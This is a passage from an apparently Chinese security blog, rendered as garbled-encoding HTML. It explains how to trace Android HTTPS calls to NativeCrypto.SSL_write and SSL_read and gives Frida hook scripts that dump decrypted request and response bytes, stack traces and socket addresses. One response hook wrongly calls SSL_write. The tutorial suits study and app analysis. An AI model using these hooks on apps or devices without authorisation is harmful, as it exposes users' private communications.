class="string">&quot;com.android.internal.util.HexDump&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">HexDump</span>.<span class="title function_">dumpHexString</span>(bytearry,offset,length))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰“å°å®ƒçš„è°ƒç”¨æ ˆ</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281751849.png" alt="image.png"> </p><h1 id="httpsçš„Requestå’ŒResponse"><a href="#httpsçš„Requestå’ŒResponse" class="headerlink" title="httpsçš„Requestå’ŒResponse"></a>httpsçš„Requestå’ŒResponse</h1><h2 id="ç¼–å†™demo"><a href="#ç¼–å†™demo" class="headerlink" title="ç¼–å†™demo"></a>ç¼–å†™demo</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//https://www.taobao.com</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">httpsock</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;www.taobao.com&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">18080</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¿™å—ä½¿ç”¨SSLæ¥ä¼ è¾“æ•°æ®</span></span><br><span class="line">        <span class="type">SSLSocketFactory</span> <span class="variable">sslSocketFactory</span> <span class="operator">=</span> (SSLSocketFactory) SSLSocketFactory.getDefault();</span><br><span class="line">        <span class="type">SSLSocket</span> <span class="variable">socket</span> <span class="operator">=</span> (SSLSocket) sslSocketFactory.createSocket(host,port);</span><br><span class="line">        <span class="comment">//Socket socket = new Socket(host,port);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        sb.append(<span class="string">&quot;GET &quot;</span>+path+<span class="string">&quot; HTTP/1.1\r\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;user-Agent: test\r\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;Host: &quot;</span>+host+<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        Log.d(<span class="string">&quot;DTA===&gt;&quot;</span>, sb.toString());</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">        outputStream.write(sb.toString().getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="keyword">while</span>( ( len = inputStream.read(buffer,<span class="number">0</span>,buffer.length) ) != -<span class="number">1</span> )&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;DTA===&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(Arrays.copyOf(buffer,len)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281820533.png" alt="image.png"> </p><p>è¿è¡Œç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸå®ç°äº†httpsçš„socketè¯·æ±‚å’Œè¿”å›ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281822439.png" alt="image.png"> </p><h2 id="request"><a href="#request" class="headerlink" title="request"></a>request</h2><p>æ ¹æ®demoå¯ä»¥çœ‹åˆ°ï¼Œå¤„ç†åŠ ä¸Šäº†ä¸€å±‚SSLSocketï¼Œå‰©ä¸‹çš„å‘é€å’Œæ¥æ”¶çš„ä»£ç éƒ½æ˜¯æ²¡æœ‰æ”¹åŠ¨çš„ã€‚</p><p>æ‰€ä»¥ï¼Œè¿™å—requestçš„ä»£ç è¿˜æ˜¯ï¼š  outputStream.write</p><p>è¯¥ä½ç½®æ‰“æ–­ç‚¹ï¼ŒæŸ¥çœ‹ outputStream åœ¨æ­¤å¤„çš„å®ç°ç±»ä¸º ï¼š<strong>ConscryptFileDescriptorSocket$SSLOutputStream</strong>ï¼Œè¿™å—çš„SSLOutputStreamä¸ºå†…éƒ¨ç±»ã€‚ã€‚ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281823354.png" alt="image.png"> </p><p>æ£€ç´¢ ConscryptFileDescriptorSocketç±»ï¼Œæ²¡æœ‰æ‰¾åˆ°ã€‚çŒœæµ‹å¯èƒ½æ˜¯ç³»ç»Ÿä¸­çš„æŸä¸ªç±»ã€‚</p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281823284.png" alt="image.png"></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281823687.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281823655.png" alt="img"> </p><p>è¿™å—ä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚ä½†æ˜¯æ²¡æœ‰åœ¨SSLOutputStreamè¿™ä¸ªå†…éƒ¨ç±»ä¸­æ‰¾åˆ°ï¼Œè¯´æ˜æ²¡æœ‰å¯¹è¿™ä¸ªæ–¹æ³•è¿›è¡Œé‡å†™ï¼Œæ‰€ä»¥ï¼Œç›´æ¥æŸ¥çœ‹ OutputStreamä¸­çš„writeæ–¹æ³•ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281824732.png" alt="image.png"> </p><p>è¿™å—è°ƒç”¨çš„æ˜¯ä¸‰ä¸ªå‚æ•°çš„writeæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯<strong>SSLOutputStream</strong>ä¸­çš„writeæ–¹æ³•ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281825523.png" alt="image.png"> </p><p>è°ƒç”¨äº† ssl.write(Platform.getFileDescriptor(socket), buf, offset, byteCount,writeTimeoutMilliseconds);   ä¼ å…¥äº†5ä¸ªå‚æ•°ã€‚</p><p>è·³è½¬ï¼Œå¯ä»¥çœ‹åˆ°å®é™…æ˜¯è°ƒç”¨äº†<strong>SslWraper</strong>è¿™ä¸ªç±»ä¸­çš„writeæ–¹æ³•ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281826674.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void write(FileDescriptor fd, byte[] buf, int offset, int len, int timeoutMillis)  throws IOException &#123;</span><br><span class="line">    NativeCrypto.SSL_write(ssl, fd, handshakeCallbacks, buf, offset, len, timeoutMillis);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281826723.png" alt="image.png"> </p><p>è¿™å—æœ€ç»ˆæ˜¯åˆ°äº† NativeCrypto.SSL_write æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯Nativeç±»ä¸­çš„äº†ï¼Œæ‰€ä»¥åˆ°æ­¤å°±å¯ä»¥äº†ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281826238.png" alt="image.png"> </p><p>æ€»ç»“ä¸€ä¸‹ï¼Œæ•´ä½“çš„ä¸€ä¸ªoutputStream.writeçš„è°ƒç”¨é“¾ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">outputStream.write--&gt;ConscryptFileDescriptorSocket$SSLOutputStream(å®ç°ç±»)--&gt;SSLOutputStream.write(å†…éƒ¨ç±»)--&gt;SslWraper.write--&gt;NativeCrypto.SSL_write(Nativeå±‚)</span><br></pre></td></tr></table></figure><h2 id="Frida-Hook-https-request"><a href="#Frida-Hook-https-request" class="headerlink" title="Frida Hook-https request"></a>Frida Hook-https request</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281828169.png" alt="image.png"> </p><p>è¿è¡Œåï¼Œå‘ç°æŠ¥é”™ï¼Ÿï¼Ÿï¼Ÿï¼Ÿæç¤ºæ‰¾ä¸åˆ°è¿™ä¸ª â€œorg.conscrypt.NativeCryptoâ€ è¿™ä¸ªç±»ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281829369.png" alt="image.png"> </p><p>çŒœæµ‹ï¼ŒNativeCryptoè¿™ä¸ªç±»çš„åŒ…åå¯èƒ½æœ‰é—®é¢˜ï¼Œä¸€èˆ¬ç±»åŠ è½½åˆ°å†…å­˜ä¸­åï¼ŒåŒ…åå¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚</p><p>javaæ–‡ä»¶ä¸­NativeCryptoç±»çš„åŒ…åä¸º â€œorg.conscryptâ€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281829625.png" alt="image.png"> </p><p>ä½¿ç”¨objectionï¼ŒæŸ¥çœ‹å†…å­˜ä¸­åŠ è½½çš„ç±»åï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android   hooking search classes NativeCrypto</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281830184.png" alt="image.png"> </p><p>ä¿®æ”¹å…¨ç±»åä¸º â€œcom.android.org.conscrypt.NativeCryptoâ€ï¼ŒæˆåŠŸæ‰“å°å‡ºè¯·æ±‚çš„æ•°æ®å’Œè°ƒç”¨å †æ ˆã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281830003.png" alt="image.png"> </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">bytearry,offset,length</span>)&#123;</span><br><span class="line">    <span class="comment">// bytearray =&gt; [B</span></span><br><span class="line">    <span class="comment">// offset =&gt; I</span></span><br><span class="line">    <span class="comment">// length =&gt; I</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">HexDump</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.internal.util.HexDump&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">HexDump</span>.<span class="title function_">dumpHexString</span>(bytearry,offset,length))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰“å°å®ƒçš„è°ƒç”¨æ ˆ</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.NativeCrypto&quot;</span>).<span class="property">SSL_write</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">sslNativePointer,fd,shc, bytes,off,len,timeout</span>)&#123;</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">SSL_write</span>(sslNativePointer,fd,shc, bytes,off,len,timeout);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;        </span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><h2 id="Frida-Hook-https-response"><a href="#Frida-Hook-https-response" class="headerlink" title="Frida Hook-https response"></a>Frida Hook-https response</h2><p>åŒç†ï¼Œæ ¹æ®ä¸Šé¢çš„è°ƒç”¨é“¾ï¼Œå¯ä»¥å¾—åˆ°responseçš„æœ€ç»ˆè°ƒç”¨æ–¹æ³•ä¸ºï¼š<strong>NativeCrypto.SSL_read</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281831106.png" alt="image.png"> </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">bytearry,offset,length</span>)&#123;</span><br><span class="line">    <span class="comment">// bytearray =&gt; [B</span></span><br><span class="line">    <span class="comment">// offset =&gt; I</span></span><br><span class="line">    <span class="comment">// length =&gt; I</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">HexDump</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.internal.util.HexDump&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">HexDump</span>.<span class="title function_">dumpHexString</span>(bytearry,offset,length))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰“å°å®ƒçš„è°ƒç”¨æ ˆ</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.NativeCrypto&quot;</span>).<span class="property">SSL_read</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">sslNativePointer,fd,shc, bytes,off,len,timeout</span>)&#123;</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">SSL_write</span>.<span class="title function_">call</span>(sslNativePointer,fd,shc, bytes,off,len,timeout);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;        </span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281832767.png" alt="image.png"> </p><h2 id="æ‰“å°httpsçš„localå’Œremoteåœ°å€"><a href="#æ‰“å°httpsçš„localå’Œremoteåœ°å€" class="headerlink" title="æ‰“å°httpsçš„localå’Œremoteåœ°å€"></a>æ‰“å°httpsçš„localå’Œremoteåœ°å€</h2><p>æ ¹æ®ä¹‹å‰httpæ‰“å°åœ°å€çš„æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯è°ƒç”¨äº†<strong>this.socket</strong>çš„æ–¹æ³•æ¥æ‰“å°çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">localAddress</span> <span class="operator">=</span> <span class="built_in">this</span>.socket.value.getLocalAddress().toString()</span><br><span class="line"><span class="type">var</span> <span class="variable">remoteAddress</span> <span class="operator">=</span> <span class="built_in">this</span>.socket.value.getRemoteSocketAddress().toString()</span><br></pre></td></tr></table></figure><p>ä½†åœ¨ NativeCrypto ç±»ä¸­æ²¡æœ‰æ‰¾åˆ°socketæ–¹æ³•ã€‚</p><p>ç»§ç»­å‘å‰çœ‹ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ â€œSSLOutputStream.writeâ€ æ–¹æ³•é‡Œé¢ï¼Œä½¿ç”¨ssl.writeçš„æ—¶å€™ï¼Œæ˜¯æœ‰socketçš„ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281833314.png" alt="image.png"> </p><p>åªä¸è¿‡ï¼Œè¿™å—å°† Platform.getFileDescriptor(socket) ä½œä¸ºäº†ssl.writeçš„ä¸€ä¸ªå‚æ•°ï¼Œè¿™å—<strong>Platform.getFileDescriptorå‡½æ•°</strong>ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶çš„æè¿°ç¬¦ã€‚å¯ä»¥ç†è§£ä¸ºCè¯­è¨€ä¸­çš„openå‡½æ•°ï¼Œæ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿”å›äº†ä¸€ä¸ªæ–‡ä»¶æ“ä½œç¬¦ã€‚ã€‚ã€‚è¿™å—æƒ³è¦æ‹¿åˆ°å®ƒçš„å‚æ•° â€œsocketâ€ ï¼Œå°±æ˜¯æˆ‘ä»¬çš„ç›®çš„ã€‚</p><p>è¿™å—Fridaæä¾›äº†APIæ¥å£ï¼šâ€Socketâ€ï¼Œå®ƒé‡Œé¢æœ‰å®šä¹‰ä¸€äº›æ–¹æ³•ï¼Œå¯ä»¥è·å–åœ°å€ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281834849.png" alt="img"> </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Socket.localAddress(handle)</span><br><span class="line">Socket.peerAddress(handle)</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Ÿè¿™å—çš„handleå‚æ•°åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281834567.png" alt="img"> </p><p>ç¡®å®šå‚æ•°ç±»å‹ï¼Œè¿™å—æ˜¯è¦è¾“å…¥ä¸€ä¸ªintæ•°å­—numberã€‚ã€‚ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">function(sslNativePointer,fd,shc, bytes,off,len,timeout)</span><br></pre></td></tr></table></figure><p>functionä¸­ä¼ å…¥å‚æ•°æœ‰7ä¸ªï¼Œä½†å…¶ä¸­å…³äºå‚æ•° â€œfdâ€ çš„æè¿°æ˜¯ï¼š <strong>FileDescriptor fd</strong>ï¼ˆæ–‡ä»¶æè¿°ç¬¦ï¼‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281834538.png" alt="img"> </p><p>æŸ¥æ‰¾ FileDescriptor ç±»ï¼Œå‘ç°é‡Œé¢æ˜¯æœ‰ä¸€ä¸ª**getInt$()**çš„ç³»ç»Ÿæ–¹æ³•ï¼Œæ˜¯å¯ä»¥è·å–Descriptorçš„æ•°å€¼çš„ã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1710147482064-cc725fab-e4fe-4af5-867a-24286c6ea38d.png" alt="img"> </p><p>ç›´æ¥hookï¼Œæ‰“å°ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281834020.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281835754.png" alt="image.png"> </p><h1 id="æ•´åˆhttp-httpsæœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š"><a href="#æ•´åˆhttp-httpsæœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š" class="headerlink" title="æ•´åˆhttp+httpsæœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š"></a>æ•´åˆhttp+httpsæœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Start hooking http/https request/response&quot;</span>);</span><br><span class="line">        <span class="comment">//Hook http request</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketOutputStream&quot;</span>).<span class="property">socketWrite0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">fd,bytes,off,len</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&lt;===Hook http request===&gt;&quot;</span>);</span><br><span class="line">            <span class="title function_">printHttpAddr</span>(<span class="variable language_">this</span>.<span class="property">socket</span>,<span class="literal">true</span>);</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">socketWrite0</span>(fd,bytes,off,len);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Hook http response</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketInputStream&quot;</span>).<span class="property">socketRead0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">fd,bytes,off,len,timeout</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&lt;===Hook http response===&gt;&quot;</span>);</span><br><span class="line">            <span class="title function_">printHttpAddr</span>(<span class="variable language_">this</span>.<span class="property">socket</span>,<span class="literal">false</span>);</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">socketRead0</span>(fd,bytes,off,len,timeout);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Hook https request</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.NativeCrypto&quot;</span>).<span class="property">SSL_write</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">sslNativePointer,fd,shc,bytes,off,len,timeout</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&lt;===Hook https request===&gt;&quot;</span>);</span><br><span class="line">            <span class="title function_">printHttpsAddr</span>(fd,<span class="literal">true</span>);</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">SSL_write</span>(sslNativePointer,fd,shc,bytes,off,len,timeout);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Hook https response</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.NativeCrypto&quot;</span>).<span class="property">SSL_read</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">sslNativePointer,fd,shc, bytes,off,len,timeout</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&lt;===Hook https response===&gt;&quot;</span>);</span><br><span class="line">            <span class="title function_">printHttpsAddr</span>(fd,<span class="literal">false</span>);</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">SSL_read</span>(sslNativePointer,fd,shc, bytes,off,len,timeout);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å°†å†…å­˜ä¸­çš„ byte è½¬æ¢ä¸º String</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">bytearry,offset,length</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">HexDump</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.internal.util.HexDump&quot;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">HexDump</span>.<span class="title function_">dumpHexString</span>(bytearry,offset,length))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ‰“å°å®ƒçš„è°ƒç”¨æ ˆ</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ‰“å°httpè¯·æ±‚çš„åœ°å€</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">printHttpAddr</span>(<span class="params">socket,isSend</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> localAddress = socket.<span class="property">value</span>.<span class="title function_">getLocalAddress</span>().<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">var</span> remoteAddress = socket.<span class="property">value</span>.<span class="title function_">getRemoteSocketAddress</span>().<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">if</span>(isSend) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Send http request to &quot;</span> + remoteAddress + <span class="string">&quot; from &quot;</span> + localAddress);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Recv http response from &quot;</span> + remoteAddress + <span class="string">&quot; to &quot;</span> + localAddress);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ‰“å°httpsè¯·æ±‚çš„åœ°å€</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">printHttpsAddr</span>(<span class="params">fd,isSend</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> localAddress = <span class="title class_">Socket</span>.<span class="title function_">localAddress</span>(fd.<span class="title function_">getInt$</span>());</span><br><span class="line">            <span class="keyword">var</span> remoteAddress = <span class="title class_">Socket</span>.<span class="title function_">peerAddress</span>(fd.<span class="title function_">getInt$</span>());</span><br><span class="line">            <span class="keyword">if</span>(isSend) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Send https request to &quot;</span> + remoteAddress.<span class="property">ip</span> + <span class="string">&quot;:&quot;</span> + remoteAddress.<span class="property">port</span> + <span class="string">&quot; from &quot;</span> + localAddress.<span class="property">ip</span> + <span class="string">&quot;:&quot;</span> + localAddress.<span class="property">port</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Recv https response from &quot;</span> + remoteAddress.<span class="property">ip</span> + <span class="string">&quot;:&quot;</span> + remoteAddress.<span class="property">port</span> + <span class="string">&quot; to &quot;</span> + localAddress.<span class="property">ip</span> + <span class="string">&quot;:&quot;</span> + localAddress.<span class="property">port</span>); </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410281835640.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> R0capture </tag>
            
            <tag> ä»£ç è§£è¯» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>R0captureæºç è§£è¯»</title>
      <link href="/2024/10/23/R0capture%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/"/>
